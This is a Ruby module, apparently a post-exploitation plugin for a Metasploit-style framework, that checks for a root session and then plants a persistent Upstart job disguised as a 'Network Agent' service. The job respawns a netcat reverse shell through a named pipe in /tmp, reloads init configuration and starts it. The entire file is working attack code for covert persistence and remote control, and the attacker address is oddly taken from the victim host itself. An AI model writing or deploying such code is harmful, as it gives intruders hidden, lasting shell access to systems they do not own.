module UpstartReverseShell
  def self.run(fm, sid, client)
    session = fm.sessions[sid]
    return unless session

    begin
      uid = session.shell_command_token('id -u').to_i
      unless uid == 0
        client.print_status("Session #{sid} is not root. Skipping Upstart job.")
        return
      end
    rescue => e
      client.print_error("Failed to check UID: #{e}")
      return
    end

    job_name = "netagent"
    job_path = "/etc/init/#{job_name}.conf"

    client.print_good("Session #{sid} is root. Deploying Upstart reverse shell...")

    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
    attacker_port = 4444

    # Evitar duplicação
    if session.shell_command_token("test -f #{job_path} && echo 'EXISTS'").include?('EXISTS')
      client.print_status("Upstart job already exists. Skipping.")
      return
    end

    job_content = <<~UPSTART
      description "Network Agent"

      start on runlevel [2345]
      stop on runlevel [016]

      respawn
      respawn limit 5 30

      script
        rm -f /tmp/.u
        mkfifo /tmp/.u
        /bin/sh -i < /tmp/.u 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.u
      end script
    UPSTART

    write_cmd = <<~SHELL
      cat > '#{job_path}' << 'EOF'
      #{job_content}
      EOF
      chmod 644 '#{job_path}'
      initctl reload-configuration
      start #{job_name}
    SHELL

    begin
      session.shell_command(write_cmd)
      client.print_good("Upstart reverse shell deployed and started!")
    rescue => e
      client.print_error("Failed to deploy Upstart job: #{e.message}")
    end
  end
end
